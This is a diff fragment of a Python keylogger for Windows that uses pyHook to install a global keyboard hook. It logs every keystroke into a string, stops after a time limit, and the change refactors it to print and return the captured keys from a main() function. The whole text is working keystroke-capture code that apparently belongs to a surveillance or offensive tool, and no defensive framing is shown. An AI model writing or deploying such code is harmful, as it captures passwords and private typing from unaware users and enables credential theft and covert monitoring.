@@ -74,18 +74,23 @@ def KeyStroke(event):
 
         else:
             KeyLogs += ("[%s]" % event.Key)
-
-    # pass execution to next hook registered
     if time.time() - start_time > max_time:
-        print(KeyLogs)
-        sys.exit(0)
+        ctypes.windll.user32.PostQuitMessage(0)
+        return True
+    # pass execution to next hook registered
     return True
 
+def main():
+    global KeyLogs
+    # create and register a hook manager
+    kl = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
 
-# create and register a hook manager
-kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+    # register the hook and execute forever
+    kl.HookKeyboard()
+    win32gui.PumpMessages()
 
-# register the hook and execute forever
-kl.HookKeyboard()
-win32gui.PumpMessages()
+    print(KeyLogs)
+    return(KeyLogs)
+
+main()
